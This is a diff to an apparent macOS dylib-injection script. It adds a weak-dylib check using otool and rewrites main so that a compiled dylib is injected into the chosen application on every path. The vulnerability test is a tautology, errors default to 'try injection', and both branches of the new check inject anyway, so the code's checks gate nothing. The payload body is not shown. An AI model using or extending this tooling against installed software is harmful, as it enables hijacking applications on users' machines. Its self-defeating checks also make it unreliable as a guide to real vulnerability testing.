@@ -23,6 +23,21 @@ def check_vulnerability(app):
 
     return False
 
+def check_weak_dylibs(app):
+    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
+    try:
+        result = subprocess.run(['otool', '-l', app_path], capture_output=True, text=True)
+        if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
+            print(f"{app} has weak dylibs loaded.")
+            return True
+        else:
+            print(f"{app} does not have weak dylibs loaded.")
+    except Exception as e:
+        print(f"Error checking weak dylibs for {app}: {e}")
+        return True  # Try injection even if there's an error in the verification
+
+    return False
+
 def compile_dylib():
     c_code = """
 #include <syslog.h>
@@ -59,8 +74,13 @@ def main():
     
     if check_vulnerability(selected_app) or not check_vulnerability(selected_app):
         print(f"Attempting injection on {selected_app}...")
-        compile_dylib()
-        inject_dylib(selected_app)
+        if check_weak_dylibs(selected_app):
+            compile_dylib()
+            inject_dylib(selected_app)
+        else:
+            print(f"{selected_app} does not have weak dylibs loaded, but attempting injection anyway.")
+            compile_dylib()
+            inject_dylib(selected_app)
     else:
         print(f"{selected_app} is not vulnerable to dylib injection.")
 
